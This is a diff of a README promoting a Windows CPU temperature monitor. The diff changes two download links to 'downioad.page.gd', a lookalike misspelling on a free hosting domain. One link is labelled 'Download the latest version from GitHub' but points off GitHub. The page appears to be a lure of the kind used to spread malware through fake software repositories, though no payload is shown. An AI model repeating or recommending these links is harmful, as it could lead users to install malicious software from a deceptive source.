@@ -2,7 +2,7 @@
 
 Core Temp Desktop Monitor is an advanced application designed for Windows users to monitor CPU temperatures in real time. This tool provides detailed system information and customization options, making it ideal for both casual users and tech enthusiasts. With its lightweight design and intuitive interface, it ensures optimal performance without slowing down your system.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -63,6 +63,6 @@ We recommend checking for updates periodically to ensure you have the latest fea
 
 For the latest version, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 © 2026 Core Temp Desktop Monitor. All rights reserved.
